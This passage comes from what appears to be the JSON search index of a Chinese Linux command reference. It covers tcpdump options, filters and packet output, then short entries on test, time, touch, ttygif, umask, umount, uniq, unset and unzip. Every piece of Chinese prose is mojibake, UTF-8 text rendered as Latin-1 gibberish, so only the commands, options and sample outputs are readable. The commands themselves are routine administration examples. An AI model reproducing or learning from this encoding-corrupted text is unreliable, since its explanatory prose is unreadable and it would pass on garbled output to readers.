æŠŠç¼–è¯‘è¿‡çš„æ•°æ®åŒ…ç¼–ç è½¬æ¢æˆCè¯­è¨€çš„æ ¼å¼ï¼Œå¹¶å€¾å€’åˆ°æ ‡å‡†è¾“å‡ºï¼› -d dd æŠŠç¼–è¯‘è¿‡çš„æ•°æ®åŒ…ç¼–ç è½¬æ¢æˆåè¿›åˆ¶æ•°å­—çš„æ ¼å¼ï¼Œå¹¶å€¾å€’åˆ°æ ‡å‡†è¾“å‡ºï¼› -D åˆ—å‡ºæœåŠ¡å™¨æ‰€æœ‰ç½‘å¡ã€‚ tcpdumpé»˜è®¤ç›‘å¬çš„æ˜¯ç¼–å·æœ€å°çš„é‚£ä¸ªç½‘å¡ï¼Œä¸€èˆ¬æ˜¯eth0ã€‚ åœ¨è¿›è¡ŒæŠ“åŒ…æ—¶å¯ä»¥é€šè¿‡ -i å‚æ•°æŒ‡å®šç›‘å¬çš„ç½‘å¡ï¼Œanyè¡¨ç¤ºç›‘å¬æ‰€æœ‰ç½‘å¡ -e åœ¨æ¯åˆ—å€¾å€’èµ„æ–™ä¸Šæ˜¾ç¤ºè¿æ¥å±‚çº§çš„æ–‡ä»¶å¤´ï¼› -f ç”¨æ•°å­—æ˜¾ç¤ºç½‘é™…ç½‘ç»œåœ°å€ï¼› -F <è¡¨è¾¾æ–‡ä»¶> æŒ‡å®šå†…å«è¡¨è¾¾æ–¹å¼çš„æ–‡ä»¶ï¼› -i <interface> æŒ‡å®šç›‘å¬çš„ç½‘å¡åç§°ï¼Œanyè¡¨ç¤ºç›‘å¬æ‰€æœ‰çš„ç½‘å¡; å¦‚eth0ï¼› -l ä½¿ç”¨æ ‡å‡†è¾“å‡ºåˆ—çš„ç¼“å†²åŒºï¼› -n è¾“å‡ºç»“æœä¸­ï¼Œä¸æŠŠipè½¬æ¢æˆä¸»æœºåï¼ˆé»˜è®¤æ˜¾ç¤ºçš„æ˜¯ä¸»æœºåï¼‰ -N ä¸åˆ—å‡ºåŸŸåï¼› -O ä¸å°†æ•°æ®åŒ…ç¼–ç æœ€ä½³åŒ–ï¼› -p ä¸è®©ç½‘ç»œç•Œé¢è¿›å…¥æ··æ‚æ¨¡å¼ï¼› -q å¿«é€Ÿè¾“å‡ºï¼Œä»…åˆ—å‡ºå°‘æ•°çš„ä¼ è¾“åè®®ä¿¡æ¯(ç®€è¦çš„æ•°æ®åŒ…ä¿¡æ¯) -r <file> ä»æŒ‡å®šçš„æ–‡ä»¶è¯»å–æ•°æ®åŒ…æ•°æ®, ä¸å†ä»ç½‘ç»œè·å–æ•°æ®åŒ… -w <file> å°†æŠ“å–çš„æ•°æ®åŒ…ä¿å­˜åˆ°æ–‡ä»¶ï¼Œ-r å‚æ•°å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®åŒ… -W <filecount> æŒ‡å®šæ–‡ä»¶çš„æ•°é‡ï¼Œå½“æ–‡ä»¶æ»šåŠ¨åˆ°æŒ‡å®šæ•°é‡åä¼šä»ç¬¬ä¸€ä¸ªæ–‡ä»¶å¼€å§‹è¦†ç›– -s <æ•°æ®åŒ…å¤§å°> è®¾ç½®æ¯ä¸ªæ•°æ®åŒ…çš„å¤§å°ï¼› -S ç”¨ç»å¯¹è€Œéç›¸å¯¹æ•°å€¼åˆ—å‡ºTCPå…³è”æ•°ï¼› -t ä¸è¾“å‡ºæ—¶é—´æˆ³ -t t åœ¨æ¯åˆ—å€¾å€’èµ„æ–™ä¸Šæ˜¾ç¤ºæœªç»æ ¼å¼åŒ–çš„æ—¶é—´æˆ³è®°ï¼› -T <æ•°æ®åŒ…ç±»å‹> å¼ºåˆ¶å°†è¡¨è¾¾æ–¹å¼æ‰€æŒ‡å®šçš„æ•°æ®åŒ…è½¬è¯‘æˆè®¾ç½®çš„æ•°æ®åŒ…ç±»å‹ï¼› -v è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼› -v v æ›´è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼› -x ç”¨åå…­è¿›åˆ¶å­—ç åˆ—å‡ºæ•°æ®åŒ…èµ„æ–™ï¼› -w <æ•°æ®åŒ…æ–‡ä»¶> æŠŠæ•°æ®åŒ…æ•°æ®å†™å…¥æŒ‡å®šçš„æ–‡ä»¶ã€‚ é™¤äº†ä»¥ä¸Šå‚æ•°ï¼Œè¿˜æœ‰ä¸€äº›å…³é”®å­—å¯ä»¥ç”¨æ¥è¿›è¡Œæ¡ä»¶è¿‡æ»¤ï¼Œå¸¸ç”¨å…³é”®å­—å¦‚ä¸‹: host è¿‡æ»¤ä¸»æœºï¼Œå¦‚ tcpdump host 192.168.1.110 åªæŠ“å–ç»è¿‡è¿™ä¸ªipçš„æ•°æ®åŒ… src ç”¨æ¥è¿‡æ»¤è¯·æ±‚æ¥æºæ–¹çš„å‚æ•°ï¼Œå¦‚ï¼štcpdump src host 192.168.1.110, åªæŠ“å–ä»è¿™ä¸ªipè¿‡æ¥çš„æ•°æ®åŒ… dst ç”¨æ¥è¿‡æ»¤è¯·æ±‚æ¥æ”¶æ–¹çš„å‚æ•°ï¼Œå¦‚ï¼štcpdump dst host 192.168.1.110, åªæŠ“å–å‘é€åˆ°è¿™ä¸ªipçš„æ•°æ®åŒ… port è¿‡æ»¤ç«¯å£ï¼Œå¦‚ï¼štcpdump port 8080, åªæŠ“å–ç»è¿‡8080ç«¯å£çš„æ•°æ®åŒ… net è¿‡æ»¤ç½‘ç»œï¼Œå¦‚ï¼štcpdump net 192.168, åªæŠ“å–ç»è¿‡è¿™ä¸ªç½‘æ®µçš„æ•°æ®åŒ… and, not, or æ¡ä»¶è¿‡æ»¤ï¼Œå’Œå­—é¢æ„æ€ä¸€æ ·ã€‚å¦‚ï¼štcpdump net 192.168 and port 8080 æŠ“å–ç»è¿‡192.168ç½‘æ®µå¹¶ç»è¿‡8080ç«¯å£çš„æ•°æ®åŒ… æ•°æ®åŒ…åˆ†æ æŠ“å–çš„æ•°æ®åŒ…æ ¼å¼å¦‚ä¸‹: $ sudo tcpdump -i any port 443 tcpdump: data link type PKTAP tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on any, link-type PKTAP (Apple DLT_PKTAP), snapshot length 524288 bytes 18:23:05.458511 IP6 240e:399:299:b5e0:91fd:8c93:e300:58e0.63539 > 240e:d9:a600:834::15.https: Flags [.], ack 2868012794, win 4096, length 0 18:23:05.463866 IP6 240e:d9:a600:834::15.https > 240e:399:299:b5e0:91fd:8c93:e300:58e0.63539: Flags [.], ack 1, win 285, length 0 18:23:07.904922 IP 49.7.149.118.https > 192.168.101.4.61893: Flags [P.], seq 3360794318:3360794350, ack 4281540851, win 65, length 32 18:23:07.905058 IP 192.168.101.4.61893 > 49.7.149.118.https: Flags [.], ack 32, win 4096, length 0 è¯¦ç»†æ•°æ®å¯¹åº”ä¸º: 18:23:07.905058 IP 192.168.101.4.61893 > 49.7.149.118.https: Flags [.], ack 32, win 4096, length 0 æ—¶é—´æˆ³ IPè¯·æ±‚å‘é€æ–¹çš„ipå’Œç«¯å£ > è¯·æ±‚æ¥æ”¶æ–¹çš„ipå’Œç«¯å£ ack-åŒ…ç±»å‹ length-æŠ¥æ–‡ä½“çš„é•¿åº¦ Flags-æ ‡è¯†å’ŒçŠ¶æ€ win-è¡¨ç¤ºå½“å‰çª—å£çš„å¯ç”¨å¤§å° æ—¶é—´æˆ³ æ—¶:åˆ†:ç§’.å¾®ç§’ IP ç½‘é™…ç½‘ç»œåè®®çš„åç§° è¯·æ±‚å‘é€æ–¹çš„ipå’Œç«¯å£ > è¯·æ±‚æ¥æ”¶æ–¹çš„ipå’Œç«¯å£ ç«¯å£æœ‰æ—¶ä¼šæ˜¾ç¤ºä¸ºæŸä¸ªç½‘ç»œåè®®ï¼Œå¦‚httpã€sshã€mysqlç­‰* Flags [R] flagæ ‡è¯†å’ŒçŠ¶æ€ï¼Œå¯é€‰çš„çŠ¶æ€æœ‰: [S.] [.] [P.] [F.][R] seqã€ackã€fin è¡¨ç¤ºtcpåè®®çš„3æ¬¡æ¡æ‰‹å’Œ4æ¬¡æŒ¥æ‰‹çš„è¿‡ç¨‹ã€‚ seqè¡¨ç¤ºè¯·æ±‚çš„åºåˆ—å·ï¼Œackæ˜¯å›ç­”çš„åºåˆ—å·ï¼Œfinè¡¨ç¤ºå®Œæˆã€‚ è¿™é‡Œæ˜¾ç¤ºçš„åºåˆ—å·æ˜¯ç›¸å¯¹å€¼ï¼Œ-Så‚æ•°å¯ä»¥æ˜¾ç¤ºç»å¯¹å€¼ win è¡¨ç¤ºå½“å‰çª—å£çš„å¯ç”¨å¤§å° length æŠ¥æ–‡ä½“çš„é•¿åº¦ï¼Œä»é•¿åº¦å¯ä»¥ç®€å•åˆ†ææ˜¯å¦æ­£ç¡®æ¥æ”¶äº†è¯·æ±‚ é€šè¿‡ä»¥ä¸Šç»“æœåªèƒ½åšç®€å•çš„åˆ†æï¼Œå¯ä»¥ä½¿ç”¨ -w å‚æ•°æŠŠæ•°æ®åŒ…å†™å…¥æ–‡ä»¶ï¼Œ æ–‡ä»¶ä¸­è®°å½•çš„æ•°æ®åŒ…æ¯”å‘½ä»¤è¡Œè¦è¯¦ç»†çš„å¤šã€‚ å€ŸåŠ©åˆ†æå·¥å…·å¯ä»¥å¯¹æ–‡ä»¶è¿›ä¸€æ­¥åˆ†æï¼Œ è¿™é‡Œæ¨èä½¿ç”¨Wiresharkï¼Œè¿™ä¸ªå·¥å…·æ˜¯å¼€æºçš„ï¼Œå¼€ç®±å³ç”¨ä½¿ç”¨ç®€å•ï¼Œè¿™é‡Œä¸åšè¯¦ç»†ä»‹ç»äº† å¸¸ç”¨çš„å‘½ä»¤ç»„åˆ æŠ“å–8080ç«¯å£çš„æ•°æ®åŒ…: tcpdump -i any port 8080 æŠ“å–ä»192.168.1.110å‘é€åˆ°192.168.1.111çš„æ•°æ®åŒ…: tcpdump -i any src host 192.168.1.110 and dst host 192.168.1.111 æŠ“å–192.168ç½‘æ®µé™¤äº†192.168.1.110çš„è¯·æ±‚çš„æ•°æ®åŒ…: tcpdump -i any src net 192.168 and 'src host not 192.168.1.110' æŠ“å–8080ç«¯å£çš„æ•°æ®åŒ…å¹¶å†™å…¥dump.logæ–‡ä»¶ä¸­: tcpdump -i any port 8080 -w dump.log æ³¨æ„äº‹é¡¹ tcpdumpéœ€è¦ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œå¯ä»¥ç”¨sudoå‘½ä»¤æˆ–è€…rootç”¨æˆ· æŠ“å–çš„æ•°æ®åŒ…é€šè¿‡lengthå­—æ®µåªèƒ½åšä¸€äº›ç®€å•çš„åˆ¤æ–­ï¼Œæƒ³è¦è¯¦ç»†åˆ†æï¼Œéœ€è¦å€ŸåŠ©æ•°æ®åŒ…åˆ†æå·¥å…·ï¼Œå¦‚ï¼šWireshark","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcpdump.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcpdump.html"},{"title":"test","text":"åˆ¤æ–­ è·Ÿshellçš„ifè¯­å¥å·®ä¸å¤š: -nt newer than åˆ¤æ–­ file1 æ˜¯å¦æ¯” file2 æ–° -ot older than åˆ¤æ–­ file1 æ˜¯å¦æ¯” file2 æ—§ -ef åˆ¤æ–­ file1 å’Œ file2 æ˜¯å¦ä¸ºåŒä¸€æ–‡ä»¶ï¼Œå¯ç”¨åœ¨åˆ¤æ–­ hard link çš„åˆ¤å®šã€‚å³ï¼Œåˆ¤å®šä¸¤ä¸ªæ–‡ä»¶æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ª inode å¦‚: test file -nt file2","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-test.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-test.html"},{"title":"time","text":"ç»Ÿè®¡ç»™å®šå‘½ä»¤æ‰€èŠ±è´¹çš„æ€»æ—¶é—´ è¯­æ³•: time(å‚æ•°) å‚æ•° æŒ‡ä»¤ï¼šæŒ‡å®šéœ€è¦è¿è¡Œçš„é¢æŒ‡ä»¤åŠå…¶å‚æ•°ã€‚ å®ä¾‹ å½“æµ‹è¯•ä¸€ä¸ªç¨‹åºæˆ–æ¯”è¾ƒä¸åŒç®—æ³•æ—¶ï¼Œæ‰§è¡Œæ—¶é—´æ˜¯éå¸¸é‡è¦çš„ï¼Œ ä¸€ä¸ªå¥½çš„ç®—æ³•ç”¨æ—¶ä¸€å®šæ˜¯è¾ƒä¼˜çš„ã€‚ æ‰€æœ‰ç±»UNIXç³»ç»Ÿéƒ½åŒ…å«timeå‘½ä»¤ï¼Œä½¿ç”¨è¿™ä¸ªå‘½ä»¤å¯ä»¥ç»Ÿè®¡æ—¶é—´æ¶ˆè€—ã€‚ä¾‹å¦‚: [root@localhost ~]# time ls anaconda-ks.cfg install.log install.log.syslog satools text real 0m0.009s user 0m0.002s sys 0m0.007s è¾“å‡ºçš„ä¿¡æ¯åˆ†åˆ«æ˜¾ç¤ºäº†è¯¥å‘½ä»¤æ‰€èŠ±è´¹çš„realæ—¶é—´ã€useræ—¶é—´å’Œsysæ—¶é—´ã€‚ realæ—¶é—´ æŒ‡æŒ‚é’Ÿæ—¶é—´ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤å¼€å§‹æ‰§è¡Œåˆ°ç»“æŸçš„æ—¶é—´ã€‚è¿™ä¸ªçŸ­æ—¶é—´åŒ…æ‹¬å…¶ä»–è¿›ç¨‹æ‰€å ç”¨çš„æ—¶é—´ç‰‡ï¼Œå’Œè¿›ç¨‹è¢«é˜»å¡æ—¶æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ useræ—¶é—´ æŒ‡è¿›ç¨‹èŠ±è´¹åœ¨ç”¨æˆ·æ¨¡å¼ä¸­çš„CPUæ—¶é—´ï¼Œè¿™æ˜¯å”¯ä¸€çœŸæ­£ç”¨äºæ‰§è¡Œè¿›ç¨‹æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå…¶ä»–è¿›ç¨‹å’ŒèŠ±è´¹é˜»å¡çŠ¶æ€ä¸­çš„æ—¶é—´æ²¡æœ‰è®¡ç®—åœ¨å†…ã€‚ sysæ—¶é—´ æŒ‡èŠ±è´¹åœ¨å†…æ ¸æ¨¡å¼ä¸­çš„CPUæ—¶é—´ï¼Œä»£è¡¨åœ¨å†…æ ¸ä¸­æ‰§ç³»ç»Ÿè°ƒç”¨æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œè¿™ä¹Ÿæ˜¯çœŸæ­£ç”±è¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´ã€‚ shellå†…å»ºä¹Ÿæœ‰ä¸€ä¸ªtimeå‘½ä»¤ï¼Œå½“è¿è¡Œtimeæ—¶å€™æ˜¯è°ƒç”¨çš„ç³»ç»Ÿå†…å»ºå‘½ä»¤ï¼Œ å› ä¸ºç³»ç»Ÿå†…å»ºçš„åŠŸèƒ½æœ‰é™ï¼Œæ‰€ä»¥éœ€è¦æ—¶é—´å…¶ä»–åŠŸèƒ½éœ€è¦ä½¿ç”¨timeå‘½ä»¤å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ /usr/bin/time ä½¿ç”¨ -o é€‰é¡¹å°†æ‰§è¡Œæ—¶é—´å†™å…¥åˆ°æ–‡ä»¶ä¸­: /usr/bin/time -o outfile.txt ls ä½¿ç”¨ -a é€‰é¡¹è¿½åŠ ä¿¡æ¯: /usr/bin/time -a -o outfile.txt ls ä½¿ç”¨ -f é€‰é¡¹æ ¼å¼åŒ–æ—¶é—´è¾“å‡º: /usr/bin/time -f \"time: %U\" ls -f é€‰é¡¹åçš„å‚æ•° å‚æ•° æè¿° %E realæ—¶é—´ï¼Œæ˜¾ç¤ºæ ¼å¼ä¸º[å°æ—¶:]åˆ†é’Ÿ:ç§’ %U useræ—¶é—´ã€‚ %S sysæ—¶é—´ã€‚ %C è¿›è¡Œè®¡æ—¶çš„å‘½ä»¤åç§°å’Œå‘½ä»¤è¡Œå‚æ•°ã€‚ %D è¿›ç¨‹éå…±äº«æ•°æ®åŒºåŸŸï¼Œä»¥KBä¸ºå•ä½ã€‚ %x å‘½ä»¤é€€å‡ºçŠ¶æ€ã€‚ %k è¿›ç¨‹æ¥æ”¶åˆ°çš„ä¿¡å·æ•°é‡ã€‚ %w è¿›ç¨‹è¢«äº¤æ¢å‡ºä¸»å­˜çš„æ¬¡æ•°ã€‚ %Z ç³»ç»Ÿçš„é¡µé¢å¤§å°ï¼Œè¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå¸¸é‡ï¼Œä¸ç”¨ç³»ç»Ÿä¸­å¸¸é‡å€¼ä¹Ÿä¸åŒã€‚ %P è¿›ç¨‹æ‰€è·å–çš„CPUæ—¶é—´ç™¾åˆ†ç™¾ï¼Œè¿™ä¸ªå€¼ç­‰äº user+system æ—¶é—´é™¤ä»¥æ€»å…±çš„è¿è¡Œæ—¶é—´ã€‚ %K è¿›ç¨‹çš„å¹³å‡æ€»å†…å­˜ä½¿ç”¨é‡ï¼ˆdata+stack+textï¼‰ï¼Œå•ä½æ˜¯ KB ã€‚ %w è¿›ç¨‹ä¸»åŠ¨è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•°ï¼Œä¾‹å¦‚ç­‰å¾…I/Oæ“ä½œå®Œæˆã€‚ %c è¿›ç¨‹è¢«è¿«è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•°ï¼ˆç”±äºæ—¶é—´ç‰‡åˆ°æœŸï¼‰ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-time.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-time.html"},{"title":"touch","text":"åˆ›å»ºç©ºæ–‡ä»¶ æŒ‡å®šæ—¶é—´çš„æ–‡ä»¶åˆ›å»º: touch -t '202110211245.23' te.txt","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-touch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-touch.html"},{"title":"ttygif","text":"ç»ˆç«¯å½•å±å·¥å…· githubåœ°å€: https://github.com/icholy/ttygif debianå®‰è£…: apt install ttygif macå®‰è£…: brew install ttygif ç”¨æ³•: ttygif [option] <in_file> [out.gif] in_file: ä»å“ªä¸ª text/x-script æ–‡ä»¶è¯»å–è¾“å…¥ out.gif: è¾“å‡ºæ–‡ä»¶å, é»˜è®¤ä¸º tty.gif é€‰é¡¹(ä¸åŒç³»ç»Ÿçš„è²Œä¼¼æœ‰ç‚¹ä¸ä¸€æ ·): -f, --fullscreen : include window border -s, --speed : Set speed [1.0] -h, --help : print this help -v, --version : print version ç»ˆç«¯å½•åˆ¶ å¼€å§‹å½•åˆ¶: ttyrec <file_name> è‹¥ä¸ç»™ file_name , åˆ™é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶æ˜¯ ttyrecord , ä¹Ÿå¯ä»¥ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/script æˆ–è€… /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/asciinema , éƒ½æ”¯æŒç”Ÿæˆ text/x-script æ–‡ä»¶ é€€å‡ºå½•åˆ¶(æˆ–è€…ç›´æ¥ Ctrl + D ): exit å°† text/x-script æ–‡ä»¶è½¬æ¢ä¸ºgif: ttygif <file_name> é™„ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ code: ttyrec out.cast echo this is a test exit # è¿™ä¸ªæ—¶å€™å°±é€€å‡ºå½•åˆ¶äº† ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆout.cast # è½¬æ¢ä¸ºgifæ–‡ä»¶, é»˜è®¤ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆtty.gif, è²Œä¼¼ä¸æ”¯æŒç›´æ¥æŒ‡å®šæ–‡ä»¶å ttygif out.cast æ³¨è§£ å¦‚æœä¸æ˜¯å¾ˆéœ€è¦, å»ºè®®ä½¿ç”¨å°ä¸€ç‚¹çš„ç»ˆç«¯, ä¸ç„¶å…¨å±å½•åˆ¶ä¼šæ¯”è¾ƒå ç©ºé—´","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ttygif.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ttygif.html"},{"title":"umask","text":"å‚è€ƒ:: Linux å‘½ä»¤å¤§å…¨ Linux umaskå‘½ä»¤æŒ‡å®šåœ¨å»ºç«‹æ–‡ä»¶æ—¶é¢„è®¾çš„æƒé™æ©ç ã€‚ umaskå¯ç”¨æ¥è®¾å®š [æƒé™æ©ç ]ã€‚ [æƒé™æ©ç ]æ˜¯ç”±3ä¸ªå…«è¿›åˆ¶çš„æ•°å­—æ‰€ç»„æˆï¼Œå°†ç°æœ‰çš„å­˜å–æƒé™å‡æ‰æƒé™æ©ç åï¼Œå³å¯äº§ç”Ÿå»ºç«‹æ–‡ä»¶æ—¶é¢„è®¾çš„æƒé™ã€‚ è¯­æ³•: umask [-S][æƒé™æ©ç ] å‚æ•°è¯´æ˜ -S ä»¥æ–‡å­—çš„æ–¹å¼æ¥è¡¨ç¤ºæƒé™æ©ç ã€‚ å®ä¾‹ ä½¿ç”¨æŒ‡ä»¤\"umask\"æŸ¥çœ‹å½“å‰æƒé™æ©ç : $ umask #è·å–å½“å‰æƒé™æ©ç  æ‰§è¡Œä¸Šé¢çš„æŒ‡ä»¤åï¼Œè¾“å‡ºä¿¡æ¯å¦‚ä¸‹: 0022 æ¥ä¸‹æ¥ï¼Œä½¿ç”¨æŒ‡ä»¤\"mkdir\"åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œ å¹¶ä½¿ç”¨æŒ‡ä»¤\"ls\"è·å–è¯¥ç›®å½•çš„è¯¦ç»†ä¿¡æ¯: $ mkdir test1 #åˆ›å»ºç›®å½• $ ls â€“d â€“l test1/ #æ˜¾ç¤ºç›®å½•çš„è¯¦ç»†ä¿¡æ¯ æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤åï¼Œå°†æ˜¾ç¤ºæ–°åˆ›å»ºç›®å½•çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤º: drwxr-xr-x 2 rootlocal rootlocal 4096 2011-9-19 21:46 test1/ æ³¨æ„ï¼šåœ¨ä¸Šé¢çš„è¾“å‡ºä¿¡æ¯ä¸­ï¼Œ\"drwxr-xr-x\"=\"777-022=755\"ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umask.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umask.html"},{"title":"umount","text":"å¸è½½å·²ç»åŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿã€‚åˆ©ç”¨è®¾å¤‡åæˆ–æŒ‚è½½ç‚¹éƒ½èƒ½umountæ–‡ä»¶ç³»ç»Ÿï¼Œ ä¸è¿‡æœ€å¥½è¿˜æ˜¯é€šè¿‡æŒ‚è½½ç‚¹å¸è½½ï¼Œä»¥å…ä½¿ç”¨ç»‘å®šæŒ‚è½½ï¼ˆä¸€ä¸ªè®¾å¤‡ï¼Œå¤šä¸ªæŒ‚è½½ç‚¹ï¼‰æ—¶äº§ç”Ÿæ··ä¹±ã€‚ è¯­æ³•: umount(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ -a å¸é™¤/etc/mtabä¸­è®°å½•çš„æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿï¼› -h æ˜¾ç¤ºå¸®åŠ©ï¼› -n å¸é™¤æ—¶ä¸è¦å°†ä¿¡æ¯å­˜å…¥/etc/mtabæ–‡ä»¶ä¸­ï¼› -r è‹¥æ— æ³•æˆåŠŸå¸é™¤ï¼Œåˆ™å°è¯•ä»¥åªè¯»çš„æ–¹å¼é‡æ–°æŒ‚å…¥æ–‡ä»¶ç³»ç»Ÿï¼› -t <æ–‡ä»¶ç³»ç»Ÿç±»å‹> ä»…å¸é™¤é€‰é¡¹ä¸­æ‰€æŒ‡å®šçš„æ–‡ä»¶ç³»ç»Ÿï¼› -v æ‰§è¡Œæ—¶æ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯ï¼› -V æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ å‚æ•°: æ–‡ä»¶ç³»ç»Ÿï¼šæŒ‡å®šè¦å¸è½½çš„æ–‡ä»¶ç³»ç»Ÿæˆ–è€…å…¶å¯¹åº”çš„è®¾å¤‡æ–‡ä»¶åã€‚ å»¶è¿Ÿå¸è½½ï¼ˆlazy unmountï¼‰ä¼šç«‹å³å¸è½½ç›®å½•æ ‘é‡Œçš„æ–‡ä»¶ç³»ç»Ÿï¼Œ ç­‰åˆ°è®¾å¤‡ä¸å†ç¹å¿™æ—¶æ‰æ¸…ç†æ‰€æœ‰ç›¸å…³èµ„æº. å¸è½½å¯ç§»åŠ¨å­˜å‚¨ä»‹è´¨è¿˜å¯ä»¥ç”¨ eject å‘½ä»¤. ä¸‹é¢è¿™æ¡å‘½ä»¤ä¼šå¸è½½ [cd](http://man.linuxde.net/cd) å¹¶å¼¹å‡ºCD: eject /dev/cdrom å¸è½½å¹¶å¼¹å‡ºCD","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umount.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-umount.html"},{"title":"uniq","text":"å¿½ç•¥é‡å¤çš„è¡Œ -c , --count åœ¨æ¯è¡Œå¼€å¤´å¢åŠ é‡å¤æ¬¡æ•°ã€‚ -d , --repeated æ‰€æœ‰é‚»è¿‘çš„é‡å¤è¡Œåªè¢«æ‰“å°ä¸€æ¬¡ã€‚è¾“å‡ºå‡ºç°æ¬¡æ•°å¤§äº1çš„å†…å®¹ -D æ‰€æœ‰é‚»è¿‘çš„é‡å¤è¡Œå°†å…¨éƒ¨æ‰“å°ã€‚ -u è¾“å‡ºå‡ºç°æ¬¡æ•°ä¸º1çš„å†…å®¹","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uniq.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-uniq.html"},{"title":"unset","text":"ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/set ç›¸å unsetåˆ é™¤å˜é‡æˆ–è€…å‡½æ•°: -f #ä»…åˆ é™¤å‡½æ•° -v #ä»…åˆ é™¤å˜é‡","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unset.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unset.html"},{"title":"unzip","text":"unzip å‘½ä»¤å¯ä»¥æŸ¥çœ‹å’Œè§£å‹ç¼© zip æ–‡ä»¶ã€‚ ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/zip ç›¸å. è¯¥å‘½ä»¤çš„åŸºæœ¬æ ¼å¼å¦‚ä¸‹: unzip [é€‰é¡¹] å‹ç¼©åŒ…å é€‰é¡¹: -d ç›®å½•å å°†å‹ç¼©æ–‡ä»¶è§£å‹åˆ°æŒ‡å®šç›®å½•ä¸‹ã€‚ -n è§£å‹æ—¶å¹¶ä¸è¦†ç›–å·²ç»å­˜åœ¨çš„æ–‡ä»¶ã€‚ -o è§£å‹æ—¶è¦†ç›–å·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¹¶ä¸”æ— éœ€ç”¨æˆ·ç¡®è®¤ã€‚ -v æŸ¥çœ‹å‹ç¼©æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å‹ç¼©æ–‡ä»¶ä¸­åŒ…å«çš„æ–‡ä»¶å¤§å°ã€æ–‡ä»¶åä»¥åŠå‹ç¼©æ¯”ç­‰ï¼Œä½†å¹¶ä¸åšè§£å‹æ“ä½œã€‚ -t æµ‹è¯•å‹ç¼©æ–‡ä»¶æœ‰æ— æŸåï¼Œä½†å¹¶ä¸è§£å‹ã€‚ -x æ–‡ä»¶åˆ—è¡¨ è§£å‹æ–‡ä»¶ï¼Œä½†ä¸åŒ…å«æ–‡ä»¶åˆ—è¡¨ä¸­æŒ‡å®šçš„æ–‡ä»¶ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unzip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-unzip.html"},{"title":"update-alternatives","text":"è²Œä¼¼åªæœ‰GUIç•Œé¢æ‰æœ‰ç”¨ (DEBIANç³»åˆ—ä¸“æœ‰) ç”¨è½¯é“¾æ¥çš„æ–¹å¼å¤„ç†ç³»ç»Ÿä¸­è½¯ä»¶ç‰ˆæœ¬çš„åˆ‡æ¢ï¼Œä½¿å…¶å¤šç‰ˆæœ¬å…±å­˜. alternatives çš„ç®¡ç†ç›®å½• /etc/alternatives ç®¡ç†æ–¹å¼ ä¸»è¦æ˜¯ä¸‰å±‚è·¯å¾„ ç¬¬ä¸€å±‚è·¯å¾„, è½¯é“¾æ¥, 